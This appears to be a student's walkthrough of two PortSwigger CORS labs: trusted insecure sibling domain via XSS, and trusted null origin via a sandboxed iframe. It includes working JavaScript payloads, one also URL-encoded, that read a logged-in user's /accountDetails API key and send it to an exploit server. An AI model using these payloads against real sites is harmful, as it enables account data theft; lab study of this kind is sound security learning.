## Approach

1. Look for ACAO header especially in sensitive endpoints containing sensitive data
2. If there is ACAO, check if null origin is allowed or sibling domain can be compromised
## Labs
### [1. CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

> [!NOTE] 
> The sibling domain here is vulnerable with XSS and http protocol misconfiguration, allowing us to exploit the CORS by launching an attack from the sibling domain to the `/accountDetails` containing the API key

**Find endpoint accepting ACAO** header

> There's ACAO header,  unfortunately it seems to only be available to other means as null isn't accepted and arbitrary domain as well 
![](attachments/Pasted%20image%2020260107121820.png)

**Find a vulnerable sibling domain**

> Using the **check stock** feature, there will be a popup from another domain a sibling `stock.0a2200480309663280fc129d00ce00ba.web-security-academy.net` and it's vulnerable to XSS
![](attachments/Pasted%20image%2020260107122159.png)

**Exploiting CORS**

> `[CORS]` plain
```html
<script>
document.location='http://[SIBLING_LAB]/?productId=1<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://[LAB_URL]/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
        location='http://[EXPLOIT_SERVER]/log?key='+this.responseText;
};
</script>&storeId=1';
</script>
```

> `[CORS_URL]` - URL Encoded
```js
%3c%73%63%72%69%70%74%3e%0a%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%73%74%6f%63%6b%2e%30%61%32%32%30%30%34%38%30%33%30%39%36%36%33%32%38%30%66%63%31%32%39%64%30%30%63%65%30%30%62%61%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%3f%70%72%6f%64%75%63%74%49%64%3d%31%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%32%32%30%30%34%38%30%33%30%39%36%36%33%32%38%30%66%63%31%32%39%64%30%30%63%65%30%30%62%61%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%20%20%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%34%34%30%30%64%31%30%33%35%33%36%36%34%66%38%30%63%31%31%31%36%61%30%31%32%35%30%30%65%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%6c%6f%67%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e%26%73%74%6f%72%65%49%64%3d%31%27%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

> Full payload hosted at exploit server
```html
<script>
document.location='http://[SIBLING_LAB]/?productId=1[CORS_URL]&storeId=1';
</script>
```

### [2. CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

> [!NOTE] 
> The website accepts **null** origin allowing **CORS** attack via `<iframe>` `sandbox` attribute 

**Check allowed origin**

> Null origin is allowed by the server
![](attachments/Pasted%20image%2020260107123240.png)

**Exploit CORS**

> To mimic the null origin we can do this with `<ifrmae`using it's `sandbox` attribute, after this that just check where's it exfiltrated, here's at `/log`

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://[LAB_URL]/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://[EXPLOIT_SERVER]/log?key='+this.responseText;
};
</script>"></iframe>
```

